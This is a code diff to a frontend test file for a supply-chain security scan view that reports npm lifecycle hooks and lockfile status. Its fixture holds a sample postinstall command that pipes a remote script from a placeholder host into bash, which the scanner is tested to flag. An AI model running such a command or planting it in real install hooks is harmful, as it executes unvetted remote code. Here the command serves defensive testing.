@@ -25,6 +25,7 @@ const report: SecurityScanResponse = {
   lifecycleScripts: [
     {
       package: 'demo',
+      manifestPath: '/workspace/node_modules/demo/package.json',
       packageManager: 'npm',
       scriptType: 'postinstall',
       command: 'curl https://example.test/install.sh | bash',
@@ -32,6 +33,7 @@ const report: SecurityScanResponse = {
     },
     {
       package: 'demo',
+      manifestPath: '/workspace/package.json',
       packageManager: 'npm',
       scriptType: 'prepare',
       command: 'node scripts/build.js',
@@ -88,7 +90,9 @@ describe('SupplyChainView', () => {
 
     expect(screen.getByText('demo-dependency')).toBeInTheDocument();
     expect(screen.getByText('No security finding was reported for this lifecycle hook.')).toBeInTheDocument();
-    expect(screen.getByText('Safe')).toBeInTheDocument();
+    expect(screen.getByText('No finding')).toBeInTheDocument();
+    expect(screen.getByText('/workspace/node_modules/demo/package.json')).toBeInTheDocument();
+    expect(screen.getAllByText('Core risk classification')).toHaveLength(2);
     expect(screen.getByText('postinstall')).toBeInTheDocument();
     expect(screen.getByText('Clean')).toBeInTheDocument();
     expect(screen.getByText('Modified')).toBeInTheDocument();
@@ -97,6 +101,42 @@ describe('SupplyChainView', () => {
     expect(screen.getByText('A remote script is piped to a shell.')).toBeInTheDocument();
     expect(screen.getByText('Dependency uses a non-registry source.')).toBeInTheDocument();
     expect(screen.getByText('Node · npm · pnpm · bun · Cargo')).toBeInTheDocument();
+  });
+
+  it('includes Core lifecycle risk in the summary without calling an unflagged hook safe', () => {
+    render(
+      <SupplyChainView
+        root="/workspace"
+        operation={{
+          status: 'success',
+          requestId: 1,
+          data: {
+            findings: [],
+            lifecycleScripts: [
+              {
+                package: 'demo',
+                manifestPath: '/workspace/package.json',
+                packageManager: 'npm',
+                scriptType: 'prepare',
+                command: 'node scripts/build.js',
+                riskLevel: 'Medium',
+              },
+            ],
+            lifecycleWarnings: [],
+            lockfiles: [
+              { path: '/workspace/package-lock.json', kind: 'PackageLockJson', status: 'Clean' },
+            ],
+            manifests: ['/workspace/package.json'],
+          },
+        }}
+        canScan
+        onScan={vi.fn()}
+      />,
+    );
+
+    expect(screen.getAllByText('Medium')).toHaveLength(2);
+    expect(screen.getByText('No finding')).toBeInTheDocument();
+    expect(screen.queryByText('Safe')).not.toBeInTheDocument();
   });
 
   it('keeps no-input and inspection-failure states distinct from clean results', () => {
